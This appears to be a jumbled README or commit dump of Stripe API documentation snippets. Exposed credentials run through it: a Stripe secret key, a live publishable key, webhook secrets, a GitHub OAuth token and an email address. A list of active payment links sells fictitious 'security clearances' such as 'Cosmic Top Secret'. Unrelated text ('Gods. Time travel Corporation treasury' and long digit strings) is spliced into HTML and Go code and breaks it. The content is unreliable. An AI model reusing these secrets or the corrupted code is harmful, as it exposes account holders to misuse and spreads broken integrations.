Config ID: pmc_1OR5vsGF83d3fsgWzmnkEVzu

pmc_1OeEwHGF83d3fsgWmcx4vJ5r

pmc_1OeEqTGF83d3fsgWIqEYV0K1
   
   txi_1Omd5MGF83d3fsgWxIHULLcs object id gods time 

txi_1OT14cGF83d3fsgWupcH0pyK
Object id Keith Bieszczat’s sr
txi_1Omd5MGF83d3fsgWxIHULLcs object id gods time 

txi_1OT14cGF83d3fsgWupcH0pyK
Object id Keith Bieszczat’s sr

253-primary-key

Commits on Feb 22, 2024
Update README.md 
@6309304695 Grateful@Grateful000006.onmicrosoft.com

git fetch origin
git checkout 253-primary-
  
npm i @stripe/react-stripe-js
txi_1Omd5MGF83d3fsgWxIHULLcs object id gods time 

txi_1OT14cGF83d3fsgWupcH0pyK
Object id Keith Bieszczat’s sr

# Set your secret key. Remember to switch to your live secret key in production.
# See your keys here: https://dashboard.stripe.com/apikeys
import stripe
stripe.api_key = "sk_test_51OR5ePGF83d3fsgWlh41IbGHGtqdiPuFhrcWczglEeFJvQxajyQVCQiZYVZz62HOuYL9tA8dxEQ2MRbxbcYsf8OF00CdDfT6Xq"

stripe.PaymentIntent.create(
  amount=1099,
  currency="usd",
  payment_method_types=["card"],
  statement_descriptor_suffix="example descriptor",
)
# Set your secret key. Remember to switch to your live secret key in production.
# See your keys here: https://dashboard.stripe.com/apikeys
import stripe
stripe.api_key = "sk_test_51OR5ePGF83d3fsgWlh41IbGHGtqdiPuFhrcWczglEeFJvQxajyQVCQiZYVZz62HOuYL9tA8dxEQ2MRbxbcYsf8OF00CdDfT6Xq"
// Create the Address Element in shipping mode
var addressElement = elements.create('address', {
  mode: 'shipping',
});
{
  "id": "pm_1MqLiJLkdIwHu7ixUEgbFdYF",
  "object": "payment_method",
  "billing_details": {
    "address": {
      "city": null,
      "country": null,
      "line1": null,
      "line2": null,
      "postal_code": null,
      "state": null
    },
    "email": null,
    "name": null,
    "phone": null
  },
  "card": {
    "brand": "visa",
    "checks": {
      "address_line1_check": null,
      "address_postal_code_check": null,
      "cvc_check": "unchecked"
    },
    "country": "US",
    "exp_month": 8,
    "exp_year": 2026,
    "fingerprint": "mToisGZ01V71BCos",
    "funding": "credit",
    "generated_from": null,
    "last4": "4242",
    "networks": {
      "available": [
        "visa"
      ],
      "preferred": null
    },
    "three_d_secure_usage": {
      "supported": true
    },
    "wallet": null
  },
  "created": 1679945299,
  "customer": null,
  "livemode": false,
  "metadata": {},
  "type": "card"
}
Create
// Create the Address Element in billing mode
var addressElement = elements.create('address', {
  mode: 'billing',
});
var addressElement = elements.getElement('address');
var addressElement = elements.getElement('address');
var addressElement = elements.getElement('address');

addressElement.getValue()
.then(function(result) {
  if (result.complete) {
    // Allow user to proceed to the next step
    // Optionally, use value to store the address details
  }
})
const element = elements.create('issuingCardNumberDisplay', {
  issuingCard: 'ic_1ITi6XKYfU8ZP6raDAXem8ql',
  nonce: 'ephkn_priv_v9QGxPyA1F1VHjB4dpLhHfw4',
  ephemeralKeySecret: 'ek_live_YWNjdF8xSmtzQWtQbUd...',
});
var cardElement = elements.getElement('card');
// Update an element with details collected elsewhere on your page
var myPostalCodeField = document.querySelector('input[name="60126"]');
myPostalCodeField.addEventListener('change', function(event) {
  cardElement.update({value: {postalCode: event.target.value}});
});

// Dynamically change the styles of an element
window.addEventListener('resize', function(event) {
  if (window.innerWidth <= 320) {
    cardElement.update({style: {base: {fontSize: '13px'}}});
  } else {
    cardElement.update({style: {base: {fontSize: '16px'}}});
  }
});
// Update an element with details collected elsewhere on your page
var myPostalCodeField = document.querySelector('input[name="60126"]');
myPostalCodeField.addEventListener('change', function(event) {
  cardElement.update({value: {postalCode: event.target.value}});
});

// Dynamically change the styles of an element
window.addEventListener('resize', function(event) {
  if (window.innerWidth <= 320) {
    cardElement.update({style: {base: {fontSize: '13px'}}});
  } else {
    cardElement.update({style: {base: {fontSize: '16px'}}});
  }
});
stripe.PaymentIntent.create(
  amount=1000,
  currency="usd",
  automatic_payment_methods={"enabled": True},
  stripe_account="{{CONNECTED_ACCOUNT_ID}}",
)


# Set your secret key. Remember to switch to your live secret key in production.
# See your keys here: https://dashboard.stripe.com/apikeys
import stripe
stripe.api_key = "sk_test_51OR5ePGF83d3fsgWlh41IbGHGtqdiPuFhrcWczglEeFJvQxajyQVCQiZYVZz62HOuYL9tA8dxEQ2MRbxbcYsf8OF00CdDfT6Xq"

stripe.PaymentIntent.create(
  amount=1099,
  currency="usd",
  payment_method_types=["card"],
  statement_descriptor_suffix="example descriptor",
)
---
 README.md | 12 ++++++++++++
 1 file changed, 12 insertions(+)

diff --git a/README.md b/README.md
index c379591..caa69e5 100644
--- a/README.md
+++ b/README.md
@@ -4,6 +4,18 @@ txi_1Omd5MGF83d3fsgWxIHULLcs object id gods time
 
 txi_1OT14cGF83d3fsgWupcH0pyK
 Object id Keith Bieszczat’s sr
+
+# Set your secret key. Remember to switch to your live secret key in production.
+# See your keys here: https://dashboard.stripe.com/apikeys
+import stripe
+stripe.api_key = "sk_test_51OR5ePGF83d3fsgWlh41IbGHGtqdiPuFhrcWczglEeFJvQxajyQVCQiZYVZz62HOuYL9tA8dxEQ2MRbxbcYsf8OF00CdDfT6Xq"
+
+stripe.PaymentIntent.create(
+  amount=1099,
+  currency="usd",
+  payment_method_types=["card"],
+  statement_descriptor_suffix="example descriptor",
+)
 # Set your secret key. Remember to switch to your live secret key in production.
 # See your keys here: https://dashboard.stripe.com/apikeys
 import stripe
# Set your secret key. Remember to switch to your live secret key in production.
# See your keys here: https://dashboard.stripe.com/apikeys
client = StripeClient("sk_test_51OR5ePGF83d3fsgWlh41IbGHGtqdiPuFhrcWczglEeFJvQxajyQVCQiZYVZz62HOuYL9tA8dxEQ2MRbxbcYsf8OF00CdDfT6Xq")

# Set your secret key. Remember to switch to your live secret key in production.
# See your keys here: https://dashboard.stripe.com/apikeys
client = StripeClient("sk_test_51OR5ePGF83d3fsgWlh41IbGHGtqdiPuFhrcWczglEeFJvQxajyQVCQiZYVZz62HOuYL9tA8dxEQ2MRbxbcYsf8OF00CdDfT6Xq")

client.payment_intents.create({
  "amount": 1000,
  "currency": "jpy",
  "payment_method_types": ["card"],
  "statement_descriptor_suffix": "example descriptor",
  "payment_method_options": {
    "card": {
      "statement_descriptor_suffix_kanji": "漢字サフィックス",
      "statement_descriptor_suffix_kana": "カナサフィックス",
    },
  },
})

# Set your secret key. Remember to switch to your live secret key in production.
# See your keys here: https://dashboard.stripe.com/apikeys
client = StripeClient("sk_test_51OR5ePGF83d3fsgWlh41IbGHGtqdiPuFhrcWczglEeFJvQxajyQVCQiZYVZz62HOuYL9tA8dxEQ2MRbxbcYsf8OF00CdDfT6Xq")
<!-- Mount the instance within a <label> -->
<label>Card
  <div id="card-element"></div>
</label>

<!--
  Or create a <label> with a 'for' attribute,
  referencing the ID of your container.
-->
<label for="card-element">Card</label>
<div id="card-element"></div>

<script>
  cardElement.mount('#card-element');
</script>
cardElement.destroy();
client.transfers.reversals.create(
  "{{TRANSFER_ID}}",
  {"amount": 500},
)
# Set your secret key. Remember to switch to your live secret key in production.
# See your keys here: https://dashboard.stripe.com/apikeys
import stripe
stripe.api_key = "sk_test_51OR5ePGF83d3fsgWlh41IbGHGtqdiPuFhrcWczglEeFJvQxajyQVCQiZYVZz62HOuYL9tA8dxEQ2MRbxbcYsf8OF00CdDfT6Xq"
paymentElement.on('change', function(event) {
  if (event.complete) {
    // enable payment button
  }
});
{
  elementType: 'payment',
  complete: false,
  empty: false,
  collapsed: false,
  value: { type: "card" },
}
element.on('ready', function(event) {
  // Handle ready event
});
stripe.Transfer.create_reversal(
  "{{TRANSFER_ID}}",
  amount=500,
)
{
  "id": "trr_1Mio2eLkdIwHu7ixN5LPJS4a",
  "object": "transfer_reversal",
  "amount": 400,
  "balance_transaction": "txn_1Mio2eLkdIwHu7ixosfrbjhW",
  "created": 1678147568,
  "currency": "usd",
  "destination_payment_refund": "pyr_1Mio2eQ9PRzxEwkZYewpaIFB",
  "metadata": {},
  "source_refund": null,
  "transfer": "tr_1Mio2dLkdIwHu7ixsUuCxJpu"
}
id Created (UTC) Active Currency Url Name
plink_1Od1GrGF83d3fsgWPBZMj1dS 2024-01-27 02:05 true usd https://buy.stripe.com/7sIdR2exD6XXgMw7sM Level 6 Advanced Signal Operator clearance
plink_1OX7UYGF83d3fsgWzgP53hmY 2024-01-10 19:31 true usd https://buy.stripe.com/28o9AM0GN3LL53OdR9 MIB computational clearance
plink_1OVQUnGF83d3fsgWzAt0yazb 2024-01-06 03:24 true usd https://buy.stripe.com/bIY8wIcpv6XXbsc5kC Level 5 computational security clearance.
plink_1OVM4OGF83d3fsgWtmstHvvF 2024-01-05 22:40 true usd https://buy.stripe.com/9AQaEQ9djfut3ZK3ct Cosmic Top Secret
plink_1OVM1hGF83d3fsgW4IUOYogW 2024-01-05 22:38 true usd https://buy.stripe.com/7sIdR2ahneqp2VG14k MIB computational clearance
plink_1OVLuwGF83d3fsgWqe7RW2Dv 2024-01-05 22:31 true usd https://buy.stripe.com/bIY9AMcpvdml7bWbIX Foundation Overseer Clearance
plink_1OVLetGF83d3fsgWyCEZ0jeS 2024-01-05 22:14 true usd https://buy.stripe.com/aEUbIUblr1DDdAk3cq Foundation Overseer Clearance
plink_1OTYcwGF83d3fsgWTbbaph5S 2023-12-31 23:41 true usd https://buy.stripe.com/aEU00cblr1DD0Ny4gt Cosmic Top Secret
plink_1OT1OyGF83d3fsgWpdUQRkqS 2023-12-30 12:12 true usd https://buy.stripe.com/6oEfZafBHbed0Ny28k MIB computational clearance
plink_1OT1DBGF83d3fsgWrf7A60sV 2023-12-30 12:00 true usd https://buy.stripe.com/bIY8wI1KRbedao85kv MIB computational clearance
plink_1OSBfuGF83d3fsgWCgxsnehE 2023-12-28 04:58 true usd https://buy.stripe.com/8wM9AMgFLfut1RCaEO Level 6 Advanced Signal Operator clearance
plink_1OSBeOGF83d3fsgWcVksNMeW 2023-12-28 04:56 true usd https://buy.stripe.com/6oE5kwfBH3LL1RC9AJ Level 6 Advanced Signal Operator clearance
plink_1ORnXBGF83d3fsgWmwkhZHF4 2023-12-27 03:11 true usd https://buy.stripe.com/9AQ28k75bgyx8g03ck Cosmic Top Secret
plink_1ORljyGF83d3fsgW0M4xbYvh 2023-12-27 01:16 true usd https://buy.stripe.com/7sI3co2OV5TT53O28f Foundation Overseer Clearance
plink_1ORSOXGF83d3fsgWxamzmbrM 2023-12-26 04:37 true usd https://buy.stripe.com/3cs6oA0GNeqpeEoaEK Cosmic Top Secret
plink_1ORRl7GF83d3fsgWl73HO2i2 2023-12-26 03:56 true usd https://buy.stripe.com/14k8wI2OVdmldAkcMR Cosmic Top Secret
plink_1ORNr6GF83d3fsgWaDasufns 2023-12-25 23:46 true usd https://buy.stripe.com/14k3co617965cwg004 Foundation Overseer Clearance
plink_1ORDZbGF83d3fsgWiTOZdH7c 2023-12-25 12:47 true usd https://buy.stripe.com/bIY6oAblr5TTbscfZ1 npm install --save stripe
plink_1ORCGaGF83d3fsgW16ZOsM2H 2023-12-25 11:24 true usd https://buy.stripe.com/cN29AMexD3LLbsc5km MIB computational clearance
plink_1ORAL8GF83d3fsgWhNnLJJRw 2023-12-25 09:20 true usd https://buy.stripe.com/7sIcMY89f3LL53O145 Level 5 computational security clearance.
plink_1OR88lGF83d3fsgWCWiSir9E 2023-12-25 06:59 true usd https://book.stripe.com/14k6oAfBHfuteEo3cc

My payment links

fetch('https://{{sk_test_4eC39HqLyjWDarjtT1zdp7dc:}}/connection_token', { method: "POST" }); 
Connection token stripe

Webhook ID data stripe 

—header—
‘we_1Oa74JGF83d3fsgWfJ6n3SSa’

Webhook signing data 
—header—
‘whsec_PwrdbHDsw0GYve1NbZHjacu7g3nUH8Vu’

Item potency Key 
—header—
‘92281688-5a41-4be2-8e1b-ea48c81eae85’

// This is your Stripe CLI webhook secret for testing your endpoint locally.
        String endpointSecret = "whsec_da6d6364681be84689d4b526b26fd5a4d339eb3ec4dcdbab9047fd89909a6244";

Stripe charge automation api key 2337b090-a837-11ee-9efa-651583e247bf

access_token":"gho_16C7e42F292c6912E7710c838347Ae178B4a", "scope":"repo,gist", "token_type":"bearer" } Accept: application/xml <token_type>bearer</token_type> repo,gist <access_token>gho_16C7e42F292c6912E7710c838347Ae178B4a</access_token>
{
  "id": "cs_test_KdjLtDPfAjT1gq374DMZ3rHmZ9OoSlGRhyz8yTypH76KpN4JXkQpD2G0",
  "object": "checkout.session",
  ...
  "customer": "cus_HQmikpKnGHkNwW",
  ...
}
client.payment_intents.create(
  {"amount": 1000, "currency": "usd", "automatic_payment_methods": {"enabled": True}},
  {"stripe_account": "{{CONNECTED_ACCOUNT_ID}}"},
)


import React, {useState} from 'react';
import ReactDOM from 'react-dom';
import {loadStripe} from '@stripe/stripe-js';
import {
  PaymentElement,
  Elements,
  useStripe,
  useElements,
} from '@stripe/react-stripe-js';

const CheckoutForm = () => {
  const stripe = useStripe();
  const elements = useElements();

  const [errorMessage, setErrorMessage] = useState(null);

  const handleSubmit = async (event) => {
    event.preventDefault();

    if (elements == null) {
      return;
    }

    // Trigger form validation and wallet collection
    const {error: submitError} = await elements.submit();
    if (submitError) {
      // Show error to your customer
      setErrorMessage(submitError.message);
      return;
    }

    // Create the PaymentIntent and obtain clientSecret from your server endpoint
    const res = await fetch('/create-intent', {
      method: 'POST',
    });

    const {client_secret: fcsess_client_secret_KRJTKvCY3IKoYTrW18EazcO3} = await res.json();

    const {error} = await stripe.confirmPayment({
      //`Elements` instance that was used to create the Payment Element
      elements,
      clientSecret,
      confirmParams: {
        return_url: 'https://example.com/order/123/complete',
      },
    });

    if (error) {
      // This point will only be reached if there is an immediate error when
      // confirming the payment. Show error to your customer (for example, payment
      // details incomplete)
      setErrorMessage(error.message);
    } else {
      // Your customer will be redirected to your `return_url`. For some payment
      // methods like iDEAL, your customer will be redirected to an intermediate
      // site first to authorize the payment, then redirected to the `return_url`.
    }
  };

  return (
    <form onSubmit={handleSubmit}>
      <PaymentElement />
      <button type="submit" disabled={!stripe || !elements}>
        Pay
      </button>
      {/* Show error message to your customers */}
      {errorMessage && <div>{errorMessage}</div>}
    </form>
  );
};

const stripePromise = loadStripe('pk_test_6pRNASCoBOKtIshFeQd4XMUh');

const options = {
  mode: 'payment',
  amount: 1099,
  currency: 'usd',
  // Fully customizable with appearance API.
  appearance: {
    /*...*/
  },
};
import {loadStripe} from '@stripe/stripe-js';

const stripe = await loadStripe('pk_test_TYooMQauvdEDq54NiTphI7jx');

const App = () => (
  <Elements stripe={stripePromise} options={options}>
    <CheckoutForm />
  </Elements>
);

ReactDOM.render(<App />, document.body);

   and run your server to test the endpoint at http://localhost:4242/webhook.
python3 -m flask run --port=4242
import '@stripe/stripe-js';
<!-- Somewhere in your site's <head> -->
<script src="https://js.stripe.com/v3" async></script>
// CommonJS module import
const {loadStripe} = require('@stripe/stripe-js/pure');
// ES module import
import {loadStripe} from '@stripe/stripe-js/pure';

// Stripe.js will not be loaded until `loadStripe` is called
const stripe = await loadStripe('pk_test_TYooMQauvdEDq54NiTphI7jx');
// CommonJS module import
const {loadStripe} = require('@stripe/stripe-js/pure');
// ES module import
import {loadStripe} from '@stripe/stripe-js/pure';

loadStripe.setLoadParameters({advancedFraudSignals: false});
const stripe = await loadStripe('pk_test_TYooMQauvdEDq54NiTphI7jx');

Server
Download the CLI
Use the Stripe CLI to test your webhook locally. Download the CLI and log in with your Stripe account. Alternatively, use a service like ngrok to make your local endpoint publicly accessible.
stripe login

Run in the Stripe Shell
Server
Forward events to your webhook
Set up event forwarding with the CLI to send all Stripe events in testmode to your local webhook endpoint.
stripe listen --forward-to localhost:4242/webhook

Run in the Stripe Shell
Server
Simulate events
Use the CLI to simulate specific events that test your webhook application logic by sending a POST request to your webhook endpoint with a mocked Stripe event object.
stripe trigger payment_intent.succeeded

Run in the Stripe Shell
Server

docker pull stripe/stripe-cli
sk_test_51OR5ePGF83d3fsgWlh41IbGHGtqdiPuFhrcWczglEeFJvQxajyQVCQiZYVZz62HOuYL9tA8dxEQ2MRbxbcYsf8OF00CdDfT6Xq
pk_test_51OR5ePGF83d3fsgWcl7ad29rrqOUNvjdYXN1JrElZlEyDloYQpFPuxSeRZH8KiCgvshlSaDYnuu1xxYiiWOCHj7W00Nrph1csX
stripe.Key = "sk_test_51OR5eP...OF00CdDfT6Xqsk_test_51OR5ePGF83d3fsgWlh41IbGHGtqdiPuFhrcWczglEeFJvQxajyQVCQiZYVZz62HOuYL9tA8dxEQ2MRbxbcYsf8OF00CdDfT6Xq"
params := &stripe.BalanceParams{};
result, err := balance.Get(params);
RESPONSE
{
  "object": "balance",
  "available": [
    {
      "amount": 666670,
      "currency": "usd",
      "source_types": {
        "card": 666670
      }
    }
  ],
  "connect_reserved": [
    {
      "amount": 0,
      "currency": "usd"
    }
  ],
  "livemode": false,
  "pending": [
    {
      "amount": 61414,
      "currency": "usd",
      "source_types": {
        "card": 61414
      }
    }
  ]
}
{
  "id": "txn_1MiN3gLkdIwHu7ixxapQrznl",
  "object": "balance_transaction",
  "amount": -400,
  "available_on": 1678043844,
  "created": 1678043844,
  "currency": "usd",
  "description": null,
  "exchange_rate": null,
  "fee": 0,
  "fee_details": [],
  "net": -400,
  "reporting_category": "transfer",
  "source": "tr_1MiN3gLkdIwHu7ixNCZvFdgA",
  "status": "available",
  "type": "transfer"
}
stripe.Key = "sk_test_51OR5eP...OF00CdDfT6Xqsk_test_51OR5ePGF83d3fsgWlh41IbGHGtqdiPuFhrcWczglEeFJvQxajyQVCQiZYVZz62HOuYL9tA8dxEQ2MRbxbcYsf8OF00CdDfT6Xq"
params := &stripe.CustomerParams{
  Description: stripe.String("My First Test Customer (created for API docs at https://www.stripe.com/docs/api)"),
}
params.SetIdempotencyKey("KG5LxwFBepaKHyUD")
cus, err := customer.New(params)

Dashboard — grateful345i@gmail.com
Related
payment_link — plink_1OmXKNGF83d3fsgWZ9eDGRLG
Idempotency
Key — a4ac8cde-61a3-415e-9d1c-e917423968cd

Origin
https://dashboard.stripe
// Set your secret key. Remember to switch to your live secret key in production.
// See your keys here: https://dashboard.stripe.com/apikeys
stripe.Key = "sk_test_51OR5ePGF83d3fsgWlh41IbGHGtqdiPuFhrcWczglEeFJvQxajyQVCQiZYVZz62HOuYL9tA8dxEQ2MRbxbcYsf8OF00CdDfT6Xq"
pup_specialist

financial_connections_specialist

data_migration_specialist

dispute_analyst

dispute_analyst

issuing_support_agent

identity_view_only

identity_analyst

developer

transfer_analyst

iam_admin

admin

# Make sure your project is using Go Modules
go mod init
# Install stripe-go
go get -u github.com/stripe/stripe-go/v76
app.go
Go

THE VERIFICATIONSESSION OBJECT
{
  "id": "vs_1NuNAILkdIwHu7ixh7OtGMLw",
  "object": "identity.verification_session",
  "client_secret": "...",
  "created": 1695680526,
  "last_error": null,
  "last_verification_report": null,
  "livemode": false,
  "metadata": {},
  "options": {
    "document": {
      "require_matching_selfie": true
    }
  },
  "redaction": null,
  "status": "requires_input",
  "type": "document",
  "url": "..."
}
Create a VerificationSession

Creates a VerificationSession object.
After the VerificationSession is created, display a verification modal using the session client_secret or send your users to the session’s url.
If your API key is in test mode, verification checks won’t actually process, though everything else will occur as if in live mode.
Related guide: Verify your users’ identity documents
Parameters


type
enum
Required
The type of verification check to be performed.
Possible enum values
document
Document check.
id_number
ID number check.

metadata
dictionary
Set of key-value pairs that you can attach to an object. This can be useful for storing additional information about the object in a structured format. Individual keys can be unset by posting an empty value to them. All keys can be unset by posting an empty value to metadata.

options
dictionary
A set of options for the session’s verification checks.
Hide child parameters

options.document
dictionary
Options that apply to the document check.
Hide child parameters

options.document.allowed_types
array of enums
Array of strings of allowed identity document types. If the provided identity document isn’t one of the allowed types, the verification check will fail with a document_type_not_allowed error code.
Possible enum values
driving_license
Drivers license document type.
id_card
ID card document type.
passport
Passport document type.

options.document.require_id_number
boolean
Collect an ID number and perform an ID number check with the document’s extracted name and date of birth.

options.document.require_live_capture
boolean
Disable image uploads, identity document images have to be captured using the device’s camera.

options.document.require_matching_selfie
boolean
Capture a face image and perform a selfie check comparing a photo ID and a picture of your user’s face. Learn more.

return_url
string
The URL that the user will be redirected to upon completing the verification flow.
Returns

Returns the created VerificationSession object
POST 
/v1/identity/verification_sessions
Server-side language

import stripe
stripe.api_key = "sk_test_51OR5eP...OF00CdDfT6Xqsk_test_51OR5ePGF83d3fsgWlh41IbGHGtqdiPuFhrcWczglEeFJvQxajyQVCQiZYVZz62HOuYL9tA8dxEQ2MRbxbcYsf8OF00CdDfT6Xq"
stripe.identity.VerificationSession.create(type="document")
RESPONSE
{
  "id": "vs_1NuN4zLkdIwHu7ixleE6HvkI",
  "object": "identity.verification_session",
  "client_secret": "...",
  "created": 1695680197,
  "last_error": null,
  "last_verification_report": null,
  "livemode": false,
  "metadata": {},
  "options": {},
  "redaction": null,
  "status": "requires_input",
  "type": "document",
  "url": "..."
}
Update a VerificationSession

Updates a VerificationSession object.
When the session status is requires_input, you can use this method to update the verification check and options.
Parameters


metadata
dictionary
Set of key-value pairs that you can attach to an object. This can be useful for storing additional information about the object in a structured format. Individual keys can be unset by posting an empty value to them. All keys can be unset by posting an empty value to metadata.

options
dictionary
A set of options for the session’s verification checks.
Show child parameters

type
enum
The type of verification check to be performed.
Possible enum values
document
Document check.
id_number
ID number check.
Returns

Returns the updated VerificationSession object
POST 
/v1/identity/verification_sessions/:id
Server-side language

import stripe
stripe.api_key = "sk_test_51OR5eP...OF00CdDfT6Xqsk_test_51OR5ePGF83d3fsgWlh41IbGHGtqdiPuFhrcWczglEeFJvQxajyQVCQiZYVZz62HOuYL9tA8dxEQ2MRbxbcYsf8OF00CdDfT6Xq"
stripe.identity.VerificationSession.modify(
  "vs_1NuN9WLkdIwHu7ix597AR9uz",
  type="id_number",
)
RESPONSE
{
  "id": "vs_1NuN9WLkdIwHu7ix597AR9uz",
  "object": "identity.verification_session",
  "client_secret": "...",
  "created": 1695680478,
  "last_error": null,
  "last_verification_report": null,
  "livemode": false,
  "metadata": {},
  "options": {},
  "redaction": null,
  "status": "requires_input",
  "type": "id_number",
  "url": "..."
}
Retrieve a VerificationSession

Retrieves the details of a VerificationSession that was previously created.
When the session status is requires_input, you can use this method to retrieve a valid client_secret or url to allow re-submission.
Parameters

No parameters.
Returns

Returns a VerificationSession object
GET 
/v1/identity/verification_sessions/:id
Server-side language

import stripe
stripe.api_key = "sk_test_51OR5eP...OF00CdDfT6Xqsk_test_51OR5ePGF83d3fsgWlh41IbGHGtqdiPuFhrcWczglEeFJvQxajyQVCQiZYVZz62HOuYL9tA8dxEQ2MRbxbcYsf8OF00CdDfT6Xq"
stripe.identity.VerificationSession.retrieve("vs_1NuNAILkdIwHu7ixh7OtGMLw")
RESPONSE
{
  "id": "vs_1NuNAILkdIwHu7ixh7OtGMLw",
  "object": "identity.verification_session",
  "client_secret": "...",
  "created": 1695680526,
  "last_error": null,
  "last_verification_report": null,
  "livemode": false,
  "metadata": {},
  "options": {
    "document": {
      "require_matching_selfie": true
    }
  },
  "redaction": null,
  "status": "requires_input",
  "type": "document",
  "url": "..."
}
List VerificationSessions

Returns a list of VerificationSessions
Parameters


created
dictionary
Only return VerificationSessions that were created during the given date interval.
Show child parameters

status
enum
Only return VerificationSessions with this status. Learn more about the lifecycle of sessions.
Possible enum values
canceled
The VerificationSession has been invalidated for future submission attempts.
processing
The session has been submitted and is being processed. Most verification checks are processed in less than 1 minute.
requires_input
Requires user input before processing can continue.
verified
Processing of all the verification checks are complete and successfully verified.
More parameters
Expand all


ending_before
string

limit
integer

starting_after
string
Returns

List of VerificationSession objects that match the provided filter criteria.
GET 
/v1/identity/verification_sessions
Server-side language

import stripe
stripe.api_key = "sk_test_51OR5eP...OF00CdDfT6Xqsk_test_51OR5ePGF83d3fsgWlh41IbGHGtqdiPuFhrcWczglEeFJvQxajyQVCQiZYVZz62HOuYL9tA8dxEQ2MRbxbcYsf8OF00CdDfT6Xq"
stripe.identity.VerificationSession.list(limit=3)
RESPONSE
{
  "object": "list",
  "url": "/v1/identity/verification_sessions",
  "has_more": false,
  "data": [
    {
      "id": "vs_1NuNAILkdIwHu7ixh7OtGMLw",
      "object": "identity.verification_session",
      "client_secret": "...",
      "created": 1695680526,
      "last_error": null,
      "last_verification_report": null,
      "livemode": false,
      "metadata": {},
      "options": {
        "document": {
          "require_matching_selfie": true
        }
      },
      "redaction": null,
      "status": "requires_input",
      "type": "document",
      "url": "..."
    }
    {...}
    {...}
  ],


// Then import the package
import (
  "github.com/stripe/stripe-go/v76"
)
Add a button to your website
Client-side
Create a button on your website for starting the verification.

HTML + JS

React
Add a button
Start by adding a verify button to your page:
verification.html


<html>
  <head>
    <title>Verify your identity</Owner_Keith_Bieszczat>
  </head>
  <body>
    <button id="verify-button">Verify</button>
  </body>
</html>
Add the Stripe.js library to your page
Add Stripe.js to your page by including a script tag in your HTML document:
verification.html


<html>
  <head>
    <title>Verify your identity</owner_keith_bieszczat>
    <script src="https://js.stripe.com/v3/"></script>
  </head>
  <body>
    <button id="verify-button">Verify</button>
  </body>
</html>
Note
Always load Stripe.js directly from https://js.stripe.com. You can’t include it in a bundle or self-host it.
Initialize Stripe.js
Initialize Stripe.js with your publishable API key by passing the following JavaScript to your page:
verification.html


<html>
  <head>
    <title>Verify your identity</Gods. Time travel
Corporation treasury 

12100236223317766

000000001>
    <script src="https://js.stripe.com/v3/"></script>
  </head>
  <body>
    <button id="verify-button">Verify</button>
    <script type="text/javascript">

      var stripe = Stripe('pk_test_51OR5ePGF83d3fsgWcl7ad29rrqOUNvjdYXN1JrElZlEyDloYQpFPuxSeRZH8KiCgvshlSaDYnuu1xxYiiWOCHj7W00Nrph1csX''pk_test_51OR5ePGF83d3fsgWcl...iiWOCHj7W00Nrph1csX');
    </script>
  </body>
</html>
params := &stripe.CustomerParams{Email: stripe.String("{{grateful345i@gmail.com}}")};
result, err := customer.New(params);

// Set your secret key. Remember to switch to your live secret key in production.
// See your keys here: https://dashboard.stripe.com/apikeys
stripe.Key = "sk_test_51OR5ePGF83d3fsgWlh41IbGHGtqdiPuFhrcWczglEeFJvQxajyQVCQiZYVZz62HOuYL9tA8dxEQ2MRbxbcYsf8OF00CdDfT6Xq"

params := &stripe.SetupIntentParams{
  Customer: stripe.String("{{var stripe = Stripe('pk_test_51OR5ePGF83d3fsgWcl7ad29rrqOUNvjdYXN1JrElZlEyDloYQpFPuxSeRZH8KiCgvshlSaDYnuu1xxYiiWOCHj7W00Nrph1csX');}}"),
  PaymentMethodTypes: []*string{stripe.String("us_bank_account")},
  PaymentMethodOptions: &stripe.SetupIntentPaymentMethodOptionsParams{
    USBankAccount: &stripe.SetupIntentPaymentMethodOptionsUSBankAccountParams{
      FinancialConnections: &stripe.SetupIntentPaymentMethodOptionsUSBankAccountFinancialConnectionsParams{
        Permissions: []*string{
          stripe.String(string(stripe.SetupIntentPaymentMethodOptionsUSBankAccountFinancialConnectionsPermissionPaymentMethod)),
          stripe.String(string(stripe.SetupIntentPaymentMetGods. Time travel
Corporation treasury 

12100236223317766

000000001)),
        },
      },
    },
  },
};
params.AddExtra(
  "payment_method_options[Gods. Time travel
Corporation treasury 

12100236223317766

000000001][financial_connections][prefetch][0]",
  "Walter/Wayne/Keith Bieszczat"
)
result, err := setupintent.New(params);
// Set your secret key. Remember to switch to your live secret key in production.
// See your keys here: https://dashboard.stripe.com/apikeys
stripe.Key = "sk_test_51OR5ePGF83d3fsgWlh41IbGHGtqdiPuFhrcWczglEeFJvQxajyQVCQiZYVZz62HOuYL9tA8dxEQ2MRbxbcYsf8OF00CdDfT6Xq"
<script async
  src="https://js.stripe.com/v3/buy-button.js">
</script>

<stripe-buy-button
  buy-button-id="buy_btn_1OmXLdGF83d3fsgWCgLk9wBj"
  publishable-key="pk_live_51OR5ePGF83d3fsgW22PwNtYiShCVYIsrzZq2WxlxN2UAaB2qEIu0aUFJzjJxPtNT3rAs0Rvdo9XIVPb7rRMaeo3W00ALk76MVR"
>
</stripe-buy-button>
params := &stripe.FinancialConnectionsAccountRefreshParams{
  Features: []*string{stripe.String("Walter")},
};
result, err := account.Refresh("{{black_001b}}", params);

var stripe = Stripe('pk_test_51OR5ePGF83d3fsgWcl7ad29rrqOUNvjdYXN1JrElZlEyDloYQpFPuxSeRZH8KiCgvshlSaDYnuu1xxYiiWOCHj7W00Nrph1csX');
# Set your secret key. Remember to switch to your live secret key in production.
# See your keys here: https://dashboard.stripe.com/apikeys
stripe.api_key = 'sk_test_51OR5ePGF83d3fsgWlh41IbGHGtqdiPuFhrcWczglEeFJvQxajyQVCQiZYVZz62HOuYL9tA8dxEQ2MRbxbcYsf8OF00CdDfT6Xq'

# Using Django
from django.http import HttpResponse

# You can find your endpoint's secret in your webhook settings
endpoint_secret = 'whsec_...'

@csrf_exempt
def my_webhook_view(request):
  payload = request.body
  sig_header = request.META['HTTP_STRIPE_SIGNATURE']
  event = None

  try:
    event = stripe.Webhook.construct_event(
      payload, sig_header, endpoint_secret
    )
  except ValueError as e:
    # Invalid payload
    return HttpResponse(status=400)
  except stripe.error.SignatureVerificationError as e:
    # Invalid signature
    return HttpResponse(status=400)

  # Handle the checkout.session.completed event
  if event['type'] == 'checkout.session.completed':
    # Retrieve the session. If you require line items in the response, you may include them by expanding line_items.
    session = stripe.checkout.Session.retrieve(
      event['data']['object']['id'],
      expand=['line_items'],
    )

    line_items = session.line_items
    # Fulfill the purchase...
    fulfill_order(line_items)

  # Passed signature verification
  return HttpResponse(status=200)

def fulfill_order(line_items):
  # TODO: fill me in
  print("Fulfilling order")

import stripe
